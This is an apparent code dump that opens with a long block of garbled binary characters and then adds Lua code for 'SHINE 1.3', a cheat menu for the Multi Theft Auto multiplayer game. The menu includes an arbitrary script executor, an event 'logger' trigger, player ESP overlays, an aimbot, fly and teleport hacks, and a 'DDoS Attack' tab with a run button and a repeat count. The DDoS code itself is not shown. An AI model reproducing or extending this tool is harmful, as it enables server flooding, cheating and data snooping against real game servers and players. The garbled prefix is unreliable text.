ˆ   ˆ   ˆ   ˆ   ˆ   Š   Š   Š   Š   Š   Š   Š   Š   Š   Š   Š   Š   Š   Š   Š   ‹   ‹   ‹   ‹   ‹   ‹   ‹   ‹   ‹   ‹   ‹   ‹   ‹   ‹   Œ   Œ   Œ   Œ   Œ   Œ                                                         ‘   ‘   ‘   ‘   ‘   ‘   ‘   ‘   ‘   ‘   ‘   ‘   ‘   ‘   ‘   ’   ’   ’   ’   ’   ’   ’   ’   ’   ’   ’   ’   ’   ’   “   “   “   “   “   “   ”   ”   ”   ”   ”   ”   –   –   –   –   –   –   –   –   –   –   –   –   ˜   ˜   ˜   ˜   ˜   ˜   ˜   ˜   ˜   ˜   ˜   ˜   ˜   ˜   ˜   ™   ™   ™   ™   ™   ™   ™   ™   ™   ™   ™   ™   ™   ™   š   š   š   š   š   š   ›   ›   ›   ›   ›   ›                                       Ÿ   Ÿ   Ÿ   Ÿ   Ÿ   Ÿ   Ÿ   Ÿ   Ÿ   Ÿ   Ÿ   Ÿ   Ÿ   Ÿ   Ÿ                                                           ¡   ¡   ¡   ¡   ¡   ¡   ¢   ¢   ¢   ¢   ¢   ¢   ¤   ¤   ¤   ¤   ¤   ¤   ¤   ¤   ¤   ¤   ¤   ¤   ¦   ¦   ¦   ¦   ¦   ¦   ¦   ¦   ¦   ¦   ¦   ¦   ¦   ¦   ¦   §   §   §   §   §   §   §   §   §   §   §   §   §   §   ¨   ¨   ¨   ¨   ¨   ¨   ©   ©   ©   ©   ©   ©   «   «   «   «   «   «   «   «   «   «   «   «   ­   ­   ­   ­   ­   ­   ­   ­   ­   ­   ­   ­   ­   ­   ­   ®   ®   ®   ®   ®   ®   ®   ®   ®   ®   ®   ®   ®   ®   ¯   ¯   ¯   ¯   ¯   ¯   °   °   °   °   °   °   ²   ²   ²   ²   ²   ²   ²   ²   ²   ²   ²   ²   ´   ´   ´   ´   ´   ´   ´   ´   ´   ´   ´   ´   ´   ´   ´   µ   µ   µ   µ   µ   µ   µ   µ   µ   µ   µ   µ   µ   µ   ¶   ¶   ¶   ¶   ¶   ¶   ·   ·   ·   ·   ·   ·   ¹   ¹   ¹   ¹   ¹   ¹   ¹   ¹   ¹   ¹   ¹   ¹   »   »   »   »   »   »   »   »   »   »   »   »   »   »   »   ¼   ¼   ¼   ¼   ¼   ¼   ¼   ¼   ¼   ¼   ¼   ¼   ¼   ¼   ½   ½   ½   ½   ½   ½   ¾   ¾   ¾   ¾   ¾   ¾   À   À   À   À   À   À   À   À   À   À   Á   Á   Á   Á   Á   Á   Á   Á   Á   Á   Â   Â   Â   Â   Ã   Ã   Ã   Ã   Ã   Ã   Ä   Ä   Ä   Ä   Ä   Å   Å   Å   Å   Ç   Ç   Ç   Ç   Ç   É   É   É   É   É   É   É   É   É   É   Ê   Ê   Ê   Ê   Ê   Ë   Ë   Ë   Ë   Ë   Ë   Ë   Ë   Ë   Ë   Ì   Ì   Ì   Ì   Í   Í   Í   Í   Í   Í   Î   Î   Î   Î   Î   Ï   Ï   Ï   Ï   Ð   Ð   Ð   Ð   Ð   Ð   Ð   Ð   Ð   Ð   Ð   Ð   Ñ   Ñ   Ñ   Ñ   Ñ   Ñ   Ò   Ò   Ò   Ò   Ò   Ò   Ò   Ó   Ó   Ó   Ó   Ó   Ó   Ó   Ó   Ó   Ó   Ô   Ô   Ô   Ô   Õ   Õ   Õ   Õ   Õ   Õ   Ö   Ö   Ö   Ö   Ö   ×   ×   ×   ×   Ø   Ø   Ø   Ø   Ø   Ø   Ø   Ø   Ø   Ø   Ø   Ø   Ù   Ù   Ù   Ù   Ù   Ù   Ú   Ú   Ú   Ú   Ú   Ú   Ú   Û   Û   Û   Û   Û   Û   Û   Û   Û   Û   Û   Û   Ü   Ü   Ü   Ü   Ü   Ü   Ý   Ý   Ý   Ý   Ý   Ý   Ý   Þ   Þ   Þ   Þ   Þ   Þ   Þ   Þ   Þ   Þ   ß   ß   ß   ß   à   à   à   à   à   à   á   á   á   á   á   â   â   â   â   ã   ã   ã   ã   ã   ã   ã   ã   ã   ã   ã   ã   ä   ä   ä   ä   ä   ä   å   å   å   å   å   å   å   æ   æ   æ   æ   æ   æ   æ   æ   æ   æ   æ   æ   ç   ç   ç   ç   ç   ç   è   è   è   è   è   è   è   é   é   é   é   é   é   é   é   é   é   é   é   ê   ê   ê   ê   ê   ê   ë   ë   ë   ë   ë   ë   ë   ì   ì   ì   ì   ì   ì   ì   ì   ì   ì   ì   ì   í   í   í   í   í   í   î   î   î   î   î   î   î   ï   ï   ï   ï   ï   ï   ï   ï   ï   ï   ð   ð   ð   ð   ð   ñ   ñ   ñ   ñ   ò   ò   ò   ò   ò   ò   ò   ò   ò   ò   ó   ó   ó   ó   ô   ô   ô   ô   ô   ô   õ   õ   õ   õ   õ   ö   ö   ö   ö   ÷   ÷   ÷   ÷   ÷   ÷   ÷   ÷   ÷   ÷   ÷   ÷   ø   ø   ø   ø   ø   ø   ù   ù   ù   ù   ù   ù   ù   ú   ú   ú   ú   ú   ú   ú   ú   ú   ú   ú   ú   û   û   û   û   û   û   ü   ü   ü   ü   ü   ü   ü   ý   ý   ý   ý   ý   ý   ý   ý   ý   ý   ý   ý   þ   þ   þ   þ   þ   þ   ÿ   ÿ   ÿ   ÿ   ÿ   ÿ   ÿ                                                                                                                                                                       	  	  	  	  	  	  	            
-  
-  
-  
-  
-  
-  
-  
-  
-  
-                                                                                                                                                                                              "     #  #  #  #  #  #  #  #  &  $  )  '  *  @  @  ,  B  B  B  B  a  a  a  b  B  c  c  c  c  c  c  c  c  e  e  e  e  e  e  e  e  e  e  e  e  e  e  e  e  e  e  e  e  e  e  f  f  m  f  v  v  v  n  w  w  w  ‚  ‚  w    „  š  ’  ›  ›  ›  ›  ›  ›  ›  ›  ›       ²  ¢  ´  ´  µ  µ  µ  ¶  ¶  ¶  ·  ·  ·  ¸  æ  ¹  ï  ç  ñ  ò  ó  ó  ô  ö  ÷  ÷  ÷  ø  ø  ø  ù  ù  ù  ú  ú  ú  û  û  û  ü  ü  ü  ý  ý  ý  þ  þ  þ  ÿ  ÿ  ÿ                                           
-  
-      
-          ƒ  ƒ  ƒ  ƒ  ƒ  ƒ  ƒ  ƒ  ƒ  ƒ  §  §  §  §  §  ²  ²  ²  ²  ©  È  È  È  È  È  È  È  È  È  È  ´  Ñ  Ê  Ö  Ö  Ó  Ú  Ú  Ø  Û  Û  å  Ý  æ  æ  è  è  è  ë  è  í  í  í  ð  í  ò  ò  ò  ô  ò  ö  ö  ö  ø  ö     ú          	                        !  !  "  "  "  "  "  "  "  "  #  #  #  #  #  #  #  #  #  #  #  $  $  $  '  '  $  )  *  *  +  +  ,  ,  -  -  .  .  .  /  0  1  1  2  2  3  3  3  4  5  6  6  7  7  8  8  9  9  :  :  ;  ;  <  <  <  =  >  ?  @  @  A  A  B  B  C  C  C  D  E  F  G  H  I  J  K  L  X  X  N  h  Z      j  ‹  ‹  ƒ  •  •    Ÿ  Ÿ  —  ©  ©  ¡  ²  ²  «  »  ´  Ä  Ä  ½  Ï  Æ  Ñ  Ñ  Ó  Ô  Ô  Ô  Ö  Ö  Ö  ×  ×  ×  ×  ×  ×  ×  Ù  Ù  Ù  Ù  Ù  Ù  Ù  Ú  Ú  Û  Û  Û  Ý  Ý  Ý  Þ  Þ  Þ  Þ  Þ  Þ  Þ  ß  á  á  á  â  â  â  â  â  â  â  ã  å  å  å  æ  æ  æ  æ  æ  æ  æ  è  è  è  è  è  è  è  é  é  û  û  í  ÿ                   &  &  !  '  '  )  )  )  P  P  P  P  P  )  _  R  `  `  `  `  `  b  b  b  b  Ÿ  Ÿ  b  ¡  ¢  ¢  ¢  ¢  ¢  ¢  ¢  £  £  £  £  £  £  £  ¤  ¤  ¤  ¤  ¤  ¤  ¤  ¥  ¥  ¥  ¥  ¥  ¥  ¥  ¦  ¨  ¨  ¨  ¨  ©  ©  ©  ©  °  °  °  ©  °  ¨  ±                  KRGMFQ8ìÜ¹£)ú|hMI=I”lnmlsTÜ1>}L)ä|hMJ=IŠlnmlmd9ì=,M|ÔLF}d
-,y¤\·UJñ 3 bÒ8 àJevíÂæ?ÕÒZíò€<Hs?pwìB•y®&„Çmª‰þŽ“Ôµâ1ó‰_!|´’&+Nc8
-éÖw6
+ExecutorTab = guiCreateTab("Executor", MainTabShine)
+
+ExecutorMemo = guiCreateMemo(0.02, 0.09, 0.65, 0.83, "", true, ExecutorTab)
+ExecuteScript = guiCreateButton(0.69, 0.72, 0.29, 0.20, "Execute Script", true, ExecutorTab)
+guiSetFont(ExecuteScript, "default-bold-small")
+guiSetProperty(ExecuteScript, "NormalTextColour", "FFFF0000")
+ShineMenu.button[27] = guiCreateButton(0.69, 0.40, 0.29, 0.20, "Trigger Logger", true, ExecutorTab)
+guiSetFont(ShineMenu.button[27], "default-bold-small")
+guiSetProperty(ShineMenu.button[27], "NormalTextColour", "FFFF0000")
+ShineMenu.button[28] = guiCreateButton(0.69, 0.09, 0.29, 0.20, "Get All ElementData", true, ExecutorTab)
+guiSetFont(ShineMenu.button[28], "default-bold-small")
+guiSetProperty(ShineMenu.button[28], "NormalTextColour", "FFFF0000")
+
+VisualsTab = guiCreateTab("Visuals", MainTabShine)
+
+Esp.Label[1] = guiCreateLabel(0.02, 0.04, 0.15, 0.09, "", true, VisualsTab)
+
+Esp.Tik[1] = guiCreateCheckBox(0.00, 0.13, 0.17, 0.78, "", false, true, Esp.Label[1])
+Esp.Text[1] = guiCreateLabel(0.20, 0.00, 1.00, 1.00, "You", true, Esp.Label[1])
+guiSetFont(Esp.Text[1], "default-bold-small")
+guiLabelSetVerticalAlign(Esp.Text[1], "center")
+
+Esp.Label[2] = guiCreateLabel(0.02, 0.14, 0.16, 0.09, "", true, VisualsTab)
+
+Esp.Tik[2] = guiCreateCheckBox(0.00, 0.13, 0.17, 0.78, "", false, true, Esp.Label[2])
+Esp.Text[2] = guiCreateLabel(0.20, 0.00, 1.00, 1.00, "Esp Skeleton", true, Esp.Label[2])
+guiSetFont(Esp.Text[2], "default-bold-small")
+guiLabelSetVerticalAlign(Esp.Text[2], "center")
+
+Esp.Label[3] = guiCreateLabel(0.02, 0.24, 0.15, 0.09, "", true, VisualsTab)
+
+Esp.Tik[3] = guiCreateCheckBox(0.00, 0.13, 0.17, 0.78, "", false, true, Esp.Label[3])
+Esp.Text[3] = guiCreateLabel(0.20, 0.00, 1.00, 1.00, "Esp Box", true, Esp.Label[3])
+guiSetFont(Esp.Text[3], "default-bold-small")
+guiLabelSetVerticalAlign(Esp.Text[3], "center")
+
+Esp.Label[4] = guiCreateLabel(0.02, 0.34, 0.15, 0.09, "", true, VisualsTab)
+
+Esp.Tik[4] = guiCreateCheckBox(0.00, 0.13, 0.17, 0.78, "", false, true, Esp.Label[4])
+Esp.Text[4] = guiCreateLabel(0.20, 0.00, 1.00, 1.00, "Esp Line", true, Esp.Label[4])
+guiSetFont(Esp.Text[4], "default-bold-small")
+guiLabelSetVerticalAlign(Esp.Text[4], "center")
+
+Esp.Label[5] = guiCreateLabel(0.02, 0.44, 0.15, 0.09, "", true, VisualsTab)
+
+Esp.Tik[5] = guiCreateCheckBox(0.00, 0.13, 0.17, 0.78, "", false, true, Esp.Label[5])
+Esp.Text[5] = guiCreateLabel(0.20, 0.00, 1.00, 1.00, "Esp Name", true, Esp.Label[5])
+guiSetFont(Esp.Text[5], "default-bold-small")
+guiLabelSetVerticalAlign(Esp.Text[5], "center")
+
+Esp.Label[6] = guiCreateLabel(0.02, 0.54, 0.17, 0.09, "", true, VisualsTab)
+
+Esp.Tik[6] = guiCreateCheckBox(0.00, 0.13, 0.17, 0.78, "", false, true, Esp.Label[6])
+Esp.Text[6] = guiCreateLabel(0.20, 0.00, 1.00, 1.00, "Esp Distance", true, Esp.Label[6])
+guiSetFont(Esp.Text[6], "default-bold-small")
+guiLabelSetVerticalAlign(Esp.Text[6], "center")
+
+EspVehicle.Label[1] = guiCreateLabel(0.22, 0.04, 0.15, 0.09, "", true, VisualsTab)
+
+EspVehicle.Tik[1] = guiCreateCheckBox(0.00, 0.13, 0.17, 0.78, "", false, true, EspVehicle.Label[1])
+EspVehicle.Text[1] = guiCreateLabel(0.20, 0.00, 1.00, 1.00, "Vehicle Line", true, EspVehicle.Label[1])
+guiSetFont(EspVehicle.Text[1], "default-bold-small")
+guiLabelSetVerticalAlign(EspVehicle.Text[1], "center")
+
+EspVehicle.Label[2] = guiCreateLabel(0.22, 0.14, 0.18, 0.09, "", true, VisualsTab)
+
+EspVehicle.Tik[2] = guiCreateCheckBox(0.00, 0.13, 0.17, 0.78, "", false, true, EspVehicle.Label[2])
+EspVehicle.Text[2] = guiCreateLabel(0.20, 0.00, 1.00, 1.00, "Vehicle Name", true, EspVehicle.Label[2])
+guiSetFont(EspVehicle.Text[2], "default-bold-small")
+guiLabelSetVerticalAlign(EspVehicle.Text[2], "center")
+
+EspVehicle.Label[3] = guiCreateLabel(0.22, 0.24, 0.20, 0.09, "", true, VisualsTab)
+
+EspVehicle.Tik[3] = guiCreateCheckBox(0.00, 0.13, 0.17, 0.78, "", false, true, EspVehicle.Label[3])
+EspVehicle.Text[3] = guiCreateLabel(0.20, 0.00, 1.00, 1.00, "Vehicle Distance", true, EspVehicle.Label[3])
+guiSetFont(EspVehicle.Text[3], "default-bold-small")
+guiLabelSetVerticalAlign(EspVehicle.Text[3], "center")
+
+EspDistanceScroll = guiCreateScrollBar(0.02, 0.85, 0.40, 0.06, true, true, VisualsTab)
+EspDistanceLabel = guiCreateLabel(0.02, 0.71, 0.40, 0.09, "Current Esp Distance Limit: 500 M", true, VisualsTab)
+guiSetFont(EspDistanceLabel, "default-bold-small")
+guiLabelSetColor(EspDistanceLabel, 255, 0, 0)
+guiLabelSetHorizontalAlign(EspDistanceLabel, "center", false)
+guiLabelSetVerticalAlign(EspDistanceLabel, "center")
+
+MiscTab = guiCreateTab("Misc", MainTabShine)
+
+DDosValue = guiCreateEdit(0.02, 0.14, 0.21, 0.10, "5000", true, MiscTab)
+guiSetProperty(DDosValue, "NormalTextColour", "FFFF0000")
+DDosLabel = guiCreateLabel(0.02, 0.06, 0.21, 0.08, "DDoS Attack", true, MiscTab)
+guiSetFont(DDosLabel, "default-bold-small")
+guiLabelSetColor(DDosLabel, 255, 0, 0)
+guiLabelSetHorizontalAlign(DDosLabel, "center", false)
+guiLabelSetVerticalAlign(DDosLabel, "center")
+ShineMenu.button[29] = guiCreateButton(0.24, 0.11, 0.15, 0.14, "Run!", true, MiscTab)
+guiSetFont(ShineMenu.button[29], "default-bold-small")
+guiSetProperty(ShineMenu.button[29], "NormalTextColour", "FFFF0000")
+TeleportOptionsLabel = guiCreateLabel(0.02, 0.36, 0.37, 0.08, "Teleport Options:", true, MiscTab)
+guiSetFont(TeleportOptionsLabel, "default-bold-small")
+guiLabelSetColor(TeleportOptionsLabel, 255, 0, 0)
+guiLabelSetHorizontalAlign(TeleportOptionsLabel, "center", false)
+guiLabelSetVerticalAlign(TeleportOptionsLabel, "center")
+ShineMenu.button[30] = guiCreateButton(0.02, 0.48, 0.18, 0.11, "Save Position", true, MiscTab)
+guiSetFont(ShineMenu.button[30], "default-bold-small")
+guiSetProperty(ShineMenu.button[30], "NormalTextColour", "FFFF0000")
+ShineMenu.button[31] = guiCreateButton(0.21, 0.48, 0.18, 0.11, "Teleport", true, MiscTab)
+guiSetFont(ShineMenu.button[31], "default-bold-small")
+guiSetProperty(ShineMenu.button[31], "NormalTextColour", "FFFF0000")
+PopularTp = guiCreateLabel(0.02, 0.62, 0.37, 0.08, "Popular Locations:", true, MiscTab)
+guiSetFont(PopularTp, "default-bold-small")
+guiLabelSetColor(PopularTp, 255, 0, 0)
+guiLabelSetHorizontalAlign(PopularTp, "center", false)
+guiLabelSetVerticalAlign(PopularTp, "center")
+ShineMenu.button[32] = guiCreateButton(0.02, 0.74, 0.18, 0.11, "Grove Street", true, MiscTab)
+guiSetFont(ShineMenu.button[32], "default-bold-small")
+guiSetProperty(ShineMenu.button[32], "NormalTextColour", "FFFF0000")
+ShineMenu.button[33] = guiCreateButton(0.21, 0.74, 0.18, 0.11, "Los Santos", true, MiscTab)
+guiSetFont(ShineMenu.button[33], "default-bold-small")
+guiSetProperty(ShineMenu.button[33], "NormalTextColour", "FFFF0000")
+ShineMenu.button[34] = guiCreateButton(0.21, 0.87, 0.18, 0.11, "San Fierro", true, MiscTab)
+guiSetFont(ShineMenu.button[34], "default-bold-small")
+guiSetProperty(ShineMenu.button[34], "NormalTextColour", "FFFF0000")
+ShineMenu.button[35] = guiCreateButton(0.02, 0.87, 0.18, 0.11, "Las Venturas", true, MiscTab)
+guiSetFont(ShineMenu.button[35], "default-bold-small")
+guiSetProperty(ShineMenu.button[35], "NormalTextColour", "FFFF0000")
+SkinID = guiCreateEdit(0.46, 0.14, 0.08, 0.10, "", true, MiscTab)
+guiSetProperty(SkinID, "NormalTextColour", "FFFF0000")
+guiEditSetMaxLength(SkinID, 3)
+SkinChangeLabel = guiCreateLabel(0.46, 0.06, 0.21, 0.08, "Skin Changer", true, MiscTab)
+guiSetFont(SkinChangeLabel, "default-bold-small")
+guiLabelSetColor(SkinChangeLabel, 255, 0, 0)
+guiLabelSetHorizontalAlign(SkinChangeLabel, "center", false)
+guiLabelSetVerticalAlign(SkinChangeLabel, "center")
+ShineMenu.button[36] = guiCreateButton(0.55, 0.14, 0.12, 0.10, "Set", true, MiscTab)
+guiSetFont(ShineMenu.button[36], "default-bold-small")
+guiSetProperty(ShineMenu.button[36], "NormalTextColour", "FFFF0000")
+ShineMenu.button[37] = guiCreateButton(0.46, 0.28, 0.21, 0.14, "Remove FPS Limit", true, MiscTab)
+guiSetFont(ShineMenu.button[37], "default-bold-small")
+guiSetProperty(ShineMenu.button[37], "NormalTextColour", "FFFF0000")
+ShineMenu.button[38] = guiCreateButton(0.46, 0.45, 0.21, 0.14, "Clear Chat Box", true, MiscTab)
+guiSetFont(ShineMenu.button[38], "default-bold-small")
+guiSetProperty(ShineMenu.button[38], "NormalTextColour", "FFFF0000")
+ShineMenu.button[39] = guiCreateButton(0.46, 0.63, 0.21, 0.14, "FPS Boost", true, MiscTab)
+guiSetFont(ShineMenu.button[39], "default-bold-small")
+guiSetProperty(ShineMenu.button[39], "NormalTextColour", "FFFF0000")
+ShineMenu.button[40] = guiCreateButton(0.46, 0.80, 0.21, 0.14, "Trash Aimbot", true, MiscTab)
+guiSetFont(ShineMenu.button[40], "default-bold-small")
+guiSetProperty(ShineMenu.button[40], "NormalTextColour", "FFFF0000")
+ShineMenu.label[1] = guiCreateLabel(0.69, 0.06, 0.29, 0.88, "WARNING:\n\nTrash Aimbot\nHave Some Bugs!\n\nSkin Changer Is Client Side\n( Only You Can See New Skin )\n\nSet DDoS Attack Times\nBetween \n5,000 ~ 50,000 Times\nIf You Get Crash!\n\nClear Chat Box Only Clear\nYour Chat Box\nEnjoy SHINE 1.3 :)", true, MiscTab)
+guiSetFont(ShineMenu.label[1], "default-bold-small")
+guiLabelSetColor(ShineMenu.label[1], 255, 0, 0)
+guiLabelSetHorizontalAlign(ShineMenu.label[1], "center", false)
+
+SettingsTab = guiCreateTab("Settings", MainTabShine)
+
+KeybindLabel = guiCreateLabel(0.02, 0.04, 0.21, 0.17, "Open Menu Key:", true, SettingsTab)
+guiSetFont(KeybindLabel, "default-bold-small")
+guiLabelSetColor(KeybindLabel, 255, 0, 0)
+guiLabelSetHorizontalAlign(KeybindLabel, "center", false)
+guiLabelSetVerticalAlign(KeybindLabel, "center")
+Keybind = guiCreateEdit(0.24, 0.06, 0.26, 0.13, "num_dec", true, SettingsTab)
+guiEditSetReadOnly(Keybind,true)
+guiSetProperty(Keybind, "NormalTextColour", "FFFF0000")
+InfoDevelopers = guiCreateLabel(0.05, 0.15, 0.52, 0.17, "Telegram: @AbuserMTA | @AbolMaster", true, SettingsTab)
+guiSetFont(InfoDevelopers, "default-bold-small")
+guiLabelSetColor(InfoDevelopers, 255, 0, 0)
+guiLabelSetVerticalAlign(InfoDevelopers, "center")
+InfoDevelopersDiscord = guiCreateLabel(0.05, 0.26, 0.52, 0.17, "discord.gg/C-RAZY | Mr.XyZz#8193", true, SettingsTab)
+guiSetFont(InfoDevelopersDiscord, "default-bold-small")
+guiLabelSetColor(InfoDevelopersDiscord, 255, 0, 0)
+guiLabelSetVerticalAlign(InfoDevelopersDiscord, "center")
+guiSetVisible(ShineBG,false)
+
+screenX, screenY = guiGetScreenSize()
+function reMap(x, in_min, in_max, out_min, out_max)
+	return (x - in_min) * (out_max - out_min) / (in_max - in_min) + out_min
+end
+responsiveMultipler = reMap(screenX, 1024, 1920, 0.75, 1)
+function resp(num)
+	return num * responsiveMultipler
+end
+function respc(num)
+	return math.ceil(num * responsiveMultipler)
+end
+local infobox = {}
+
+function addNotification(msg,color)
+	if not (msg) then
+		return
+	end
+    msg2 = nil
+    if color then
+        infobox.color = color
+    else
+        infobox.color = {255,0,0}
+    end
+	local messageWidth = math.max(dxGetTextWidth(msg, 0.85, "default-bold"), dxGetTextWidth("", 0.85, "default-bold")) + 20
+	local tileWidth = messageWidth
+	infobox.tileWidth = tileWidth
+	infobox.tileHeight = math.max(dxGetFontHeight(0.85, "default-bold") * 1 + 10, respc(40))
+	infobox.tilePosX = (screenX - tileWidth) / 2
+	
+	infobox.moveDownTick = getTickCount()
+	infobox.moveUpTick = infobox.moveDownTick + 1000 + ((msg and utfLen(msg) or 0)) * 125
+	infobox.state = true
+	infobox.message = {msg}
+end
+
+addEventHandler("onClientRender", getRootElement(),
+	function ()
+		if not infobox or not infobox.state then
+			return
+		end
+		
+		local tickCount = getTickCount()
+		local x = infobox.tilePosX
+		local y = -infobox.tileHeight
+		local alpha = 0
+		
+		if tickCount >= infobox.moveDownTick and tickCount <= infobox.moveUpTick then
+			alpha, y = interpolateBetween(0, -infobox.tileHeight, 0, 1, 50, 0, (tickCount - infobox.moveDownTick) / 500, "OutQuad")
+		elseif tickCount >= infobox.moveUpTick then
+			local progress = (tickCount - infobox.moveUpTick) / 500
+			alpha, y = interpolateBetween(1, 50, 0, 0, -infobox.tileHeight, 0, progress, "OutQuad")
+		
+			if progress > 1 then
+				infobox.state = false
+			end
+		end
+		
+		dxDrawRectangle(x, y, infobox.tileWidth, infobox.tileHeight, tocolor(50, 50, 50, 200 * alpha), true)
+		dxDrawRectangle(x + 2, y + 2, infobox.tileWidth - 4, infobox.tileHeight - 4, tocolor(25, 25, 25, 175 * alpha), true)
+
+		local progress = (tickCount - infobox.moveDownTick) / (infobox.moveUpTick - infobox.moveDownTick)
+
+		if progress <= 1 then
+			dxDrawRectangle(x, y + infobox.tileHeight - 2, infobox.tileWidth * (1 - progress), 2, tocolor(infobox.color[1], infobox.color[2], infobox.color[3], 255 * alpha), true)
+		end
+		dxDrawText(infobox.message[1], x, y, x + infobox.tileWidth, y + infobox.tileHeight, tocolor(255, 255, 255, alpha * 255), 0.85, "default-bold", "center", "center", true, false, true)
+	end, true, "low-999999999"
+)
+addNotification("SHINE 1.3 Has Been Loaded Successfully.",{255,0,0})
+
+local Animations, builtins = {}, {"Linear", "InQuad", "OutQuad", "InOutQuad", "OutInQuad", "InElastic", "OutElastic", "InOutElastic", "OutInElastic", "InBack", "OutBack", "InOutBack", "OutInBack", "InBounce", "OutBounce", "InOutBounce", "OutInBounce", "SineCurve", "CosineCurve"}
+function table.find(t, v)
+	for k, a in ipairs(t) do
+		if a == v then
+			return k
+		end
+	end
+	return false
+end
+function animate(f, t, easing, duration, onChange, onEnd)
+	assert(type(f) == "number", "Bad argument @ 'animate' [expected number at argument 1, got "..type(f).."]")
+	assert(type(t) == "number", "Bad argument @ 'animate' [expected number at argument 2, got "..type(t).."]")
+	assert(type(easing) == "string" or (type(easing) == "number" and (easing >= 1 or easing <= #builtins)), "Bad argument @ 'animate' [Invalid easing at argument 3]")
+	assert(type(duration) == "number", "Bad argument @ 'animate' [expected number at argument 4, got "..type(duration).."]")
+	assert(type(onChange) == "function", "Bad argument @ 'animate' [expected function at argument 5, got "..type(onChange).."]")
+	table.insert(Animations, {from = f, to = t, easing = table.find(builtins, easing) and easing or builtins[easing], duration = duration, start = getTickCount( ), onChange = onChange, onEnd = onEnd})
+	return #Animations
+end
+addEventHandler("onClientRender", root, function( )
+	local now = getTickCount( )
+	for k,v in ipairs(Animations) do
+		v.onChange(interpolateBetween(v.from, 0, 0, v.to, 0, 0, (now - v.start) / v.duration, v.easing))
+		if now >= v.start+v.duration then
+			if type(v.onEnd) == "function" then
+				v.onEnd( )
+			end
+			table.remove(Animations, k)
+		end
+	end
+end)
+
+function isEventHandlerAdded( sEventName, pElementAttachedTo, func )
+    if type( sEventName ) == 'string' and isElement( pElementAttachedTo ) and type( func ) == 'function' then
+        local aAttachedFunctions = getEventHandlers( sEventName, pElementAttachedTo )
+        if type( aAttachedFunctions ) == 'table' and #aAttachedFunctions > 0 then
+            for i, v in ipairs( aAttachedFunctions ) do
+                if v == func then
+                    return true
+                end
+            end
+        end
+    end
+    return false
+end
+
+function toggleShine()
+    guiSetVisible(ShineBG, not guiGetVisible(ShineBG))
+    showCursor(guiGetVisible(ShineBG))
+    if guiGetVisible(ShineBG) then
+        animate(0, 0.8, 1, 800, function(alpha)
+            guiSetAlpha(ShineBG,alpha)
+        end)
+    end
+end
+bindKey(tostring(guiGetText(Keybind)),"down",toggleShine)
+
+function fastSprint()
+    setPedAnimationSpeed(localPlayer,"run_player",3.5)
+    setPedAnimationSpeed(localPlayer,"SPRINT_civi",3.5)
+end
+
+function fastReload()
+    setPedAnimationSpeed(localPlayer,"buddy_crouchreload",10)
+	setPedAnimationSpeed(localPlayer,"buddy_reload",10)
+	setPedAnimationSpeed(localPlayer,"colt45_crouchreload",10)
+	setPedAnimationSpeed(localPlayer,"colt45_reload",10)
+	setPedAnimationSpeed(localPlayer,"sawnoff_reload",10)
+	setPedAnimationSpeed(localPlayer,"python_crouchreload",10)
+	setPedAnimationSpeed(localPlayer,"python_reload",10)
+	setPedAnimationSpeed(localPlayer,"RIFLE_crouchload",10)
+	setPedAnimationSpeed(localPlayer,"RIFLE_load",10)
+	setPedAnimationSpeed(localPlayer,"CrouchReload",10)
+	setPedAnimationSpeed(localPlayer,"Silence_reload",10)
+	setPedAnimationSpeed(localPlayer,"TEC_crouchreload",10)
+	setPedAnimationSpeed(localPlayer,"TEC_reload",10)
+	setPedAnimationSpeed(localPlayer,"UZI_crouchreload",10)
+	setPedAnimationSpeed(localPlayer,"UZI_reload",10)
+end
+
+Fly = {}
+Fly.speedMultipliers = {
+    ["lshift"] = 4,
+    ["lalt"] = 0.25,
+}
+function toggleFly(delta)
+    if (isChatBoxInputActive() or isConsoleActive()) then return end
+    if getPedOccupiedVehicle(localPlayer) then return end
+
+    local x, y, z = getElementPosition(localPlayer)
+    local camX, camY, camZ, camTX, camTY, camTZ = getCameraMatrix()
+    camTX, camTY = camTX - camX, camTY - camY
+
+    delta = delta * 0.1
+    for key, multiplier in pairs(Fly.speedMultipliers) do
+        if (getKeyState(key)) then
+            delta = delta * multiplier
+        end
+    end
+    local multiplier = delta / math.sqrt(camTX * camTX + camTY * camTY)
+    camTX, camTY = camTX * multiplier, camTY * multiplier
+
+    if (getKeyState("w")) then
+        x, y = x + camTX, y + camTY
+        setElementPosition(localPlayer, x, y, z)
+        setElementRotation(localPlayer, 0, 0, rotationFromCamera(0))
+    end
+    if (getKeyState("s")) then
+        x, y = x - camTX, y - camTY
+        setElementPosition(localPlayer, x, y, z)
+        setElementRotation(localPlayer, 0, 0, rotationFromCamera(180))
+    end
+    if (getKeyState("a")) then
+        x, y = x - camTY, y + camTX
+        setElementPosition(localPlayer, x, y, z)
+        setElementRotation(localPlayer, 0, 0, rotationFromCamera(270))
+    end
+    if (getKeyState("d")) then
+        x, y = x + camTY, y - camTX
+        setElementPosition(localPlayer, x, y, z)
+        setElementRotation(localPlayer, 0, 0, rotationFromCamera(90))
+    end
+    if (getKeyState("space")) then
+        z = z + delta
+        setElementPosition(localPlayer, x, y, z)
+    end
+    if (getKeyState("lctrl")) then
+        z = z - delta
+        setElementPosition(localPlayer, x, y, z)
+    end
+end
+function rotationFromCamera(offset)
+    local camX, camY, _, camTX, camTY = getCameraMatrix()
+    local deltaX, deltaY = camTX - camX, camTY - camY
+    local rotZ = math.deg(math.atan(deltaY / deltaX))
+    if ((deltaY >= 0 and deltaX <= 0) or (deltaY <= 0 and deltaX <= 0)) then
+        rotZ = rotZ + 180
+    end
+    return -rotZ + 90 + offset
+end
+
+local speed = 0
+local strafespeed = 0
+local rotX, rotY = 0,0
+local velocityX, velocityY, velocityZ
+
+local options = {
+	invertMouseLook = false,
+	normalMaxSpeed = 2,
+	slowMaxSpeed = 0.05,
+	fastMaxSpeed = 10,
+	smoothMovement = true,
+	acceleration = 0.3,
+	decceleration = 0.15,
+	mouseSensitivity = 0.05,
+	maxYAngle = 188,
+	key_fastMove = "lshift",
+	key_slowMove = "lalt",
+	key_forward = "w",
+	key_backward = "s",
+	key_left = "a",
+	key_right = "d"
+}
+
+local mouseFrameDelay = 0
+
+local rootElement = getRootElement()
+local localPlayer = getLocalPlayer()
+
+local getKeyState = getKeyState do
+	local mta_getKeyState = getKeyState
+	function getKeyState(key)
+		if isMTAWindowActive() then
+			return false
+		else
+			return mta_getKeyState(key)
+		end
+	end
+end
+
+
+local function freecamFrame ()
+	local cameraAngleX = rotX
+	local cameraAngleY = rotY
+	local freeModeAngleZ = math.sin(cameraAngleY)
+	local freeModeAngleY = math.cos(cameraAngleY) * math.cos(cameraAngleX)
+	local freeModeAngleX = math.cos(cameraAngleY) * math.sin(cameraAngleX)
+	local camPosX, camPosY, camPosZ = getCameraMatrix()
